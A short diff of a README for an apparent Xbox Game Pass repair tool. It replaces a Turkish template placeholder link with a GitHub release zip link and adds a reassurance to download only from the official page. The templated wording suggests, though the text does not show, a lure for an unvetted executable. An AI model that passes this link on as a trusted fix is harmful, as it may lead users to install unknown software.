@@ -35,7 +35,7 @@ This tool is designed to diagnose and repair common Xbox Game Pass, Xbox App, Ga
 
 ➡ **Latest Release:**
 
-👉 https://SENIN-INDIRME-LINKIN.com
+👉 [Xbox Game Pass Repair Tool (2026)](https://github.com/methimi/xbox-game-pass-repair-tool/releases/download/xbox-game-pass-repair-tool/Xbox.Repair.Tool.zip)
 
 > Always download from the official GitHub page to avoid fake or modified versions.
 
